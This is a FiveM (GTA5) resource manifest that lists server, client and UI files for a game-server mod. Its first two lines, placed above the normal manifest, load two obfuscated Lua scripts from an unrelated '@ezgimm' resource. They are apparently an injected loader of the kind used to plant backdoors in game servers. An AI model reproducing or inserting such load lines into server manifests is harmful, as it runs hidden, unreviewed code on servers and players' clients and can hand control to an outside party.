shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'



fx_version 'adamant'
game 'gta5'
escrow_ignore {
	'config.lua',
}
lua54 'yes'
server_scripts { 'config.lua', 'server/server.lua', '@oxmysql/lib/MySQL.lua'}
lua54 "yes"
client_scripts { 'config.lua', 'client/commands.lua', 'client/events.lua', 'client/funtions.lua', 'client/nui.lua', 'client/threads.lua', }
 
ui_page "ui/index.html"
  
files { 
	"ui/index.html",
	"ui/style.css",
	'ui/script.js',
	'ui/avatar.png'
}